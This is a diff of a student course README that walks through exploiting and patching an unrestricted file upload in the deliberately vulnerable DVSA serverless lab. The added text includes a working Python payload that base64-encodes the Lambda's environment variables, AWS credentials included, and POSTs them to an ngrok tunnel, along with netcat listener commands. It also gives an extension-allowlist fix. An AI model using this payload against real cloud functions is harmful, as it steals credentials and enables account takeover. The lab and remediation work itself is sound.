@@ -1,102 +1,119 @@
-## Lesson #4: Insecure Cloud Configuration (Unrestricted File Upload)
+# DVSA Security Analysis: Remote Code Execution (RCE) via Unrestricted File Upload
+
+This repository contains a professional security analysis, exploit demonstration, and remediation guide for the **Damn Vulnerable Serverless Application (DVSA)**, specifically targeting **Lesson 4: Insecure Cloud Configuration**.
+
+This project was developed for **ICS-344: Information Security** at **King Fahd University of Petroleum and Minerals (KFUPM)**.
 
 ---
 
-
-## 🚀 Setup and Deployment
-
-Before attempting the exploit, the DVSA environment must be correctly deployed.
-
-1.  **AWS Deployment**: Deploy the official DVSA CloudFormation stack in a **non-production** AWS account.
-2.  **Access the Frontend**: Identify the CloudFront or S3 website URL for your deployment.
-3.  **Local Tools**: Ensure the following tools are installed on your local machine:
-    * **ngrok**: For creating a public tunnel to your local listener.
-    * **netcat (nc)**: To listen for incoming exfiltrated data.
-    * **CyberChef**: To decode the Base64 payloads exfiltrated by the exploit.
+## ## Project Overview
+In serverless environments, misconfigured S3 buckets combined with a lack of input validation in Lambda functions can lead to **Remote Code Execution (RCE)**. This analysis demonstrates how an attacker can upload a malicious script disguised as an image to exfiltrate sensitive environment variables and AWS IAM credentials.
 
 ---
 
-## 🔍 Vulnerability Replication: Step-by-Step
+## ## Repository Structure
+The repository is organized as follows to ensure replicability:
 
-The vulnerability exists because the application allows users to upload files via the "Contact" page without validating the file extension or content. This can be abused to execute commands or exfiltrate environment variables.
-
-### **1. Set Up Your Listeners**
-First, prepare your local environment to receive data from the vulnerable AWS Lambda function:
-* **Open a terminal** and start an `ngrok` tunnel on port 8080:
-    ```bash
-    ngrok http 8080
-    ```
-* **Open a second terminal** and start a `netcat` listener:
-    ```bash
-    nc -lvp 8080
-    ```
-
-### **2. Prepare the Malicious Payload**
-Create a file named `cat.png.python3`. Inside this file, insert a Python command designed to capture environment variables (like AWS keys and session tokens) and send them to your `ngrok` URL.
-
-> **Note:** Redact your specific `ngrok` URL if sharing screenshots of this payload.
-
-### **3. Trigger the Exploit**
-1.  Navigate to the **Contact** page of your DVSA deployment.
-2.  Fill in the "Your Name", "Your Email", and "Subject" fields with arbitrary data.
-3.  Click **Attach File** and select your `cat.png.python3` file.
-4.  Click **Send Feedback**.
-
-### **4. Capture and Decode Data**
-1.  Check your `netcat` terminal. You should see a `POST` request containing a long Base64 string.
-2.  Copy this string and paste it into **CyberChef**.
-3.  Apply the **"From Base64"** recipe.
-4.  [cite_start]You will now see the Lambda function's environment variables, including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`[cite: 123, 232].
-
----
-
-## 🛡️ Remediation & Patching
-
-The root cause is a lack of input validation on the uploaded file's metadata. The fix involves implementing a server-side check to ensure only safe file types are processed.
-
-### **1. Modify the Lambda Function**
-1.  Log in to the **AWS Management Console** and navigate to **AWS Lambda**.
-2.  Open the `DVSA-FEEDBACK-UPLOADS` function.
-3.  In the code editor, locate the commented-out helper function named `is_safe()`.
-
-### **2. Apply the Technical Fix**
-Uncomment the `is_safe()` function and the logic within the main handler that calls it. This function checks the filename for dangerous characters or unauthorized extensions.
-
-**Before (Vulnerable):**
-```python
-# The is_safe check was bypassed or commented out
-# allows any file to trigger downstream processing
+```text
+├── README.md               # Project documentation
+├── backend_code/
+│   ├── vulnerable_lambda.py # Original code with commented-out validation
+│   └── patched_lambda.py    # Remediation with active is_safe() check
+├── exploit/
+│   ├── cat.png.python3      # Malicious Python payload
+│   └── decoder_recipe.json  # CyberChef recipe for exfiltrated data
+└── screenshots/
+    ├── rce_evidence.png     # Netcat listener receiving base64 data
+    └── blocked_attack.png   # Ngrok logs showing no traffic after patch
 ```
 
-**After (Patched):**
+---
+
+## ## Setup & Deployment
+To deploy the DVSA environment for testing:
+
+1. **AWS Console:** Log in to your AWS account.
+2. **Infrastructure:** Use the provided CloudFormation/S3 templates from the DVSA repository to create the `/contact` endpoint and the `DVSA-FEEDBACK-UPLOADS` Lambda.
+3. **Connectivity:** Ensure your local machine can receive external traffic by using **ngrok**.
+
+---
+
+## ## Vulnerability Replication (Video 1)
+Follow these steps to replicate the RCE vulnerability.
+
+### 1. Prepare the Attack Infrastructure
+* **Start a local listener:** Open your terminal and run Netcat to listen for incoming data.
+  ```bash
+  nc -lvm 8080
+  ```
+* **Tunnel via Ngrok:** In a separate terminal, expose your local port to the internet.
+  ```bash
+  ngrok http 8080
+  ```
+  *Copy the forwarding URL provided (e.g., `https://random-id.ngrok-free.app`).*
+
+### 2. Create the Malicious Payload
+Create a file named `cat.png.python3`. This script reads the Lambda environment variables and sends them to your ngrok URL:
+
+```python
+import os, base64, urllib.request
+
+# The payload exfiltrates environment variables (including AWS Keys)
+env_data = str(os.environ).encode('utf-8')
+encoded_data = base64.b64encode(env_data)
+
+url = "https://your-ngrok-url.ngrok-free.app"
+req = urllib.request.Request(url, data=encoded_data, method="POST")
+urllib.request.urlopen(req)
+```
+
+### 3. Trigger the Exploit
+* Navigate to the **DVSA Feedback page** (`/contact`).
+* Enter "Hacker" in the name field.
+* Attach the `cat.png.python3` file using the **Attach File** button.
+* Click **Send Feedback**.
+
+### 4. Verification of Success
+Check your Netcat terminal. You will see a `POST` request containing a large Base64 string. Use **CyberChef** (From Base64) to decode it.
+
+---
+
+## ## Remediation & Patching (Video 2)
+The fix involves enforcing a server-side allowlist for file extensions.
+
+### 1. Technical Implementation
+Navigate to the **AWS Lambda Console** and open the `DVSA-FEEDBACK-UPLOADS` function. Locate the `is_safe` helper function. In the vulnerable version, the security check was commented out.
+
+**The Patch:**
+Uncomment the validation logic to ensure the function returns `False` if the file extension is not in the approved list (e.g., `.jpg`, `.png`).
+
 ```python
 def is_safe(filename):
-    # Ensure the filename does not contain command injection characters
-    if ".." in filename or ";" in filename:
-        return False
-    return filename.endswith(('.png', '.jpg', '.jpeg'))
+    # Enforce strict extension allowlist
+    allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif']
+    ext = os.path.splitext(filename)[1].lower()
+    
+    if ext not in allowed_extensions:
+        return False # This blocks .python3, .sh, .php, etc.
+    return True
 
-# In the handler:
-if not is_safe(uploaded_file_name):
-    return {"status": "err", "message": "Invalid file type"}
+# Implementation in the handler:
+if not is_safe(file_name):
+    return {
+        'status': 'error',
+        'message': 'Unsafe file type detected!'
+    }
 ```
 
-4.  [cite_start]Click **Deploy** to apply the changes[cite: 234].
+### 2. Verification After Fix
+* Keep your Netcat and ngrok listeners running.
+* Attempt to upload `cat.png.python3` again.
+* **Result:** The UI may show a success message (to avoid tipping off an attacker), but check your listeners—**no data is received**. 
+* The Lambda now identifies the extension as unsafe and terminates the execution before the script can run.
 
 ---
 
-## ✅ Verification After Fix
-
-1.  **Re-upload Payload**: Attempt to upload the same `cat.png.python3` file on the Contact page.
-2.  **Observe Frontend**: The application may still show a success message ("Thank you hacker"), but you must verify the backend behavior.
-3.  **Check Listener**: Observe your `netcat` and `ngrok` terminals. **No data should be received**.
-4.  [cite_start]**Confirm logs**: Check **Amazon CloudWatch** logs for the `DVSA-FEEDBACK-UPLOADS` function to confirm the `is_safe` logic correctly identified and blocked the malicious file[cite: 121, 416].
-
----
-
-## ⚠️ Security Best Practices
-* [cite_start]**Principle of Least Privilege**: Ensure the Lambda execution role does not have permissions to access sensitive S3 buckets unless absolutely necessary[cite: 104].
-* [cite_start]**Redaction**: Never commit actual AWS keys or session tokens to your repository[cite: 532].
-
----
-*This repository is for educational purposes only.*
+## ## Security Takeaways
+* **Never Trust User Input:** Even file names and extensions can be used as attack vectors.
+* **Defense in Depth:** S3 buckets should have restricted execution permissions, and Lambda functions must perform strict input validation.
+* **Principle of Least Privilege:** If the Lambda execution role didn't have permission to access environment variables or make outbound requests to unknown IPs, the impact of this RCE would have been significantly reduced.
